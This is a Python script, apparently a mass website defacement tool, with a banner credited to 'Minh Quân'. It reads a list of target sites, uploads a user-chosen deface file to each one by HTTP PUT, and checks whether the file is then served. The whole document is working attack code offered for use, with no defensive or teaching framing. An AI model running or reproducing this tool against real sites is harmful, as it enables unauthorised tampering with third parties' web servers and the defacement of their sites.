try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
 
███╗   ███╗██╗███╗   ██╗██╗  ██╗     ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
████╗ ████║██║████╗  ██║██║  ██║    ██╔═══██╗██║   ██║██╔══██╗████╗  ██║                    
██╔████╔██║██║██╔██╗ ██║███████║    ██║   ██║██║   ██║███████║██╔██╗ ██║                       
██║╚██╔╝██║██║██║╚██╗██║██╔══██║    ██║▄▄ ██║██║   ██║██╔══██║██║╚██╗██║                     
██║ ╚═╝ ██║██║██║ ╚████║██║  ██║    ╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝     ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                             Copyright by Minh Quân
"""

b = '\x1b[38;5;57m' 	
h = '\x1b[45m'
m = '\x1b[38;5;198m'

def aox(script,target_file="listsite.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("Attacking to %d Website."%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code == 200 and requests.get(f"{site}/{script}").text == open(script, "r").read():
               print(m+"["+h+" DONE"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+b+" DONE!"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = input("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
